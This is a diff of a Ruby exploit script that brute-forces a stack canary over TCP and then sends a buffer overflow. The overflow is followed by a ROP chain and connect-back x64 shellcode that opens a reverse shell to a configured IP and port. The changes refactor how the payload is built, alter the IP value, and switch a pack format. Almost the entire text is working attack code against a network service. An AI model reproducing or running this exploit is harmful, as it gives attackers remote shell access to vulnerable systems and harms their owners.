@@ -31,7 +31,7 @@ $ropchain = [
 ].pack("Q*")
 
 #connect back shellcode x64
-ip = "1.1.1.1" 
+ip = "0.0.0.0" 
 port = 4000
 sip = IPAddr::new(ip).to_i.pack(:int_be)
 sport = port.pack(:int16_be)
@@ -63,17 +63,14 @@ $payload << $chunk
 
 def crash(cookie, cookie_test=true)
   data = ''
+  payload = $payload.dup
+  payload << ["A"*(4096+8), cookie].join
+  payload << ["C"*24, $ropchain].join unless cookie_test
 
   5.times do
-    payload = $payload.dup
-
     tcp_session(ARGV[0],ARGV[1].to_i) do |s|
       $count += 1
-
-      payload << ["A"*(4096+8), cookie].join
-      payload << ["C"*24, $ropchain].join unless cookie_test
-
-      s.send(payload,0)
+      s.send(payload, 0)
       data = s.recv(10)
     end
 
@@ -92,7 +89,7 @@ if ARGV.length < 3
       print "\r#{c}"
       s1 = s + [c]
 
-      unless crash(s1.pack("C*"))
+      unless crash(s1.pack("c*"))
         s << c
         puts
         break
@@ -115,5 +112,5 @@ print_info "Found cookie: #{s.hex_escape} #{s.length}"
 print_info "PRESS ENTER TO GIVE THE SHIT TO THE HOLE AT #{ip} #{port}"
 $stdin.readline 
 
-crash(s,false)
+crash(s, false)
 print_info "#{$count} connections"
